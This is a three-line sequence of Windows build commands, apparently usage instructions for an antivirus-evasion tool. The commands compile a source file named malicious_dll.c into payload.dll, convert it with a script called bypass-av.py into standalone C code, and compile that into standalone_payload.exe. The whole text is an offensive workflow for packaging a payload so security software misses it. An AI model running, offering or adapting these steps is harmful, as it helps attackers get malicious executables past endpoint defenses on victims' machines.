gcc.exe malicious_dll.c -IC:\Python27\include -LC:\Python27\libs -lpython27 -shared -o payload.dll
python bypass-av.py --library=payload.dll --function=payload --output=standalone_payload.c
gcc.exe standalone_payload.c -o standalone_payload.exe